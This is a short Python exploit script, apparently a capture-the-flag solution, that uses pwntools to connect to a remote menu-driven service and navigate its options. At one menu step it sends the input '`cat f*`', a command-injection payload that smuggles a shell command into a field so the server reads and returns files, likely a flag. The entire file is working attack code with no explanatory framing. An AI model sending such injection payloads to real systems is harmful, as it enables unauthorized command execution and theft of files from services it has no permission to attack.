#!/usr/bin/env python
import pwn
import sys
import struct

c = pwn.remote(sys.argv[1], int(sys.argv[2]))
c.recvuntil(">")
c.send(b"2\n")
c.recvuntil(">")
c.send(b"zh\n")
c.send(b"ni hao\n")
c.recvuntil(">")
c.send(b"4\n")
c.send(b"zh\n")
c.recvuntil(">")
c.send(b"5\n")
c.send(b"`cat f*`\n")
c.recvuntil(">")
c.send(b"6\n")
c.recvall()
